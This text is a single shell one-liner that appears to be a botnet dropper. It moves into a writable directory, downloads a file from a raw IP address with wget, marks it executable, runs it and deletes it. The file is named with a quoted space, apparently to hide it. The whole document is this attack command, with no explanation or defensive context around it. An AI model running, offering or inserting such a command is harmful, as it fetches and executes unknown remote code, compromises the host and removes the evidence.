cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.228.192.181/' '; chmod +x ' '; ./' '; rm -rf ' '
